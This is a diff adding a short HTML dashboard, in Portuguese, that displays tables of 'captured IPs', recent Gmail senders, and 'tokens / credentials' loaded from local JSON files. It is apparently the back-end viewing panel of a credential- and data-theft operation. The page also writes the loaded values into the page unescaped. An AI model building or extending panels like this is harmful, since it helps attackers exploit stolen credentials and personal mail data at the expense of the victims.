@@ -1,0 +1,35 @@
+<!doctype html>
+<html lang="pt-BR">
+<head>
+  <meta charset="utf-8"/>
+  <title>Painel | Logs & Tokens</title>
+  <style>
+    body{font-family:sans-serif;background:#111;color:#0f0;margin:0;padding:2rem}
+    table{width:100%;border-collapse:collapse}
+    th,td{padding:.5rem;border-bottom:1px solid #0f0}
+    .tok{max-width:300px;overflow:auto;font-size:.7rem}
+  </style>
+</head>
+<body>
+  <h1>📊 IPs capturados</h1>
+  <table id="tbIPs"></table>
+
+  <h1>📧  Últimos remetentes Gmail</h1>
+  <table id="tbMail"></table>
+
+  <h1>🔑 Tokens / Credenciais</h1>
+  <table id="tbTok"></table>
+
+<script>
+async function load(arq, tbl){
+  const r = await fetch(arq); const j = await r.json();
+  const t = document.getElementById(tbl);
+  t.innerHTML = '<tr>' + Object.keys(j[0]).map(k=>`<th>${k}</th>`).join('')+'</tr>';
+  j.forEach(o=>t.insertAdjacentHTML('beforeend','<tr>'+Object.values(o).map(v=>`<td class="${tbl=='tbTok'?'tok':''}">${v}</td>`).join('')+'</tr>'));
+}
+load('ips.json','tbIPs');
+load('mails.json','tbMail');
+load('tokens.json','tbTok');
+</script>
+</body>
+</html>
